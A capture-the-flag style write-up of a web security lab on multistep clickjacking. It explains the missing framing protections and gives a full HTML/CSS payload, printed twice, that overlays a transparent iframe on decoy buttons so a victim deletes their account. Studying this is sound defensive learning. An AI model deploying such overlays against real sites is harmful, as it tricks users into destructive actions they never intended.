## Multistep clickjacking

This lab has some account functionality that is protected by a CSRF token and also has a confirmation dialog to protect against Clickjacking. To solve this lab construct an attack that fools the user into clicking the delete account button and the confirmation dialog by clicking on "Click me first" and "Click me next" decoy actions. You will need to use two elements for this lab.

You can log in to the account yourself using the following credentials: wiener:peter

Note :

The victim will be using Chrome so test your exploit on that browser.

## Notes

- Exploit Server
- Account deletion requires confirmation
- Multi-step UI interaction
- No `X-Frame-Options`
- No `CSP frame-ancestors`

## Resume

1. Load the account page inside an iframe
2. Make the iframe transparent
3. Overlay the first fake clickable element
4. Align the first bait with the `Delete account` button
5. Overlay the second fake clickable element
6. Align the second bait with the confirmation `Yes` button
7. Deliver the exploit to the victim

## Solve

The application allows framing because no anti-clickjacking protections are enabled.

The response does not contain:

```http
X-Frame-Options
```

and does not define:

```http
Content-Security-Policy: frame-ancestors
```

The account deletion process requires two separate user interactions:

1. Clicking:

```text
Delete account
```

2. Confirming the action with:

```text
Yes
```

Because both interactions occur inside the same framed page, an attacker can align two fake visible elements with the hidden buttons.

The attack page loads the sensitive account page inside an iframe:

```html
<iframe src="https://0a86005b03420bff807c8a4b008600df.web-security-academy.net/my-account"></iframe>
```

The iframe is made transparent using:

```css
opacity: 0.1;
```

The iframe is layered above the visible content using:

```css
z-index: 2;
```

Two fake clickable elements are then positioned underneath the iframe.

First bait element:

```html
<div>Click me first</div>
```

aligned with:

```text
Delete account
```

Second bait element:

```html
<div2>Click me next</div2>
```

aligned with:

```text
Yes
```

confirmation button.

When the victim clicks the first visible bait, the browser actually clicks the hidden:

```text
Delete account
```

button inside the iframe.

The confirmation dialog then appears inside the framed page.

When the victim clicks the second bait element, the browser forwards the click to the hidden:

```text
Yes
```

confirmation button.

As a result, the account deletion action is fully completed.

Exploit payload:

```html
<style>
    iframe {
        position:relative;
        width:700;
        height: 700;
        opacity: 0.1;
        z-index: 2;
    }

    div {
        position:absolute;
        top:500;
        left:60;
        z-index: 1;
    }

    div2 {
        position:absolute;
        top:300;
        left:195;
        z-index: 1;
    }
</style>

<div>Click me first</div>
<div2>Click me next</div2>

<iframe src="https://0a86005b03420bff807c8a4b008600df.web-security-academy.net/my-account"></iframe>
```

Breakdown:

- `opacity:0.1` → makes the iframe mostly transparent for alignment
- `z-index:2` → places the iframe above visible bait content
- First bait element → aligned with the `Delete account` button
- Second bait element → aligned with the confirmation `Yes` button
- `top` and `left` values → precisely position the fake elements

The victim only sees:

```text
Click me first
```

followed by:

```text
Click me next
```

but actually interacts with:

```text
Delete account
```

and then:

```text
Yes
```

inside the transparent iframe.

The victim unknowingly confirms the destructive action, resulting in account deletion.

```html
<style>
    iframe {
        position:relative;
        width:700;
        height: 700;
        opacity: 0.1;
        z-index: 2;
    }

    div {
        position:absolute;
        top:500;
        left:60;
        z-index: 1;
    }

    div2 {
        position:absolute;
        top:300;
        left:195;
        z-index: 1;
    }
</style>

<div>Click me first</div>
<div2>Click me next</div2>

<iframe src="https://0a86005b03420bff807c8a4b008600df.web-security-academy.net/my-account"></iframe>
```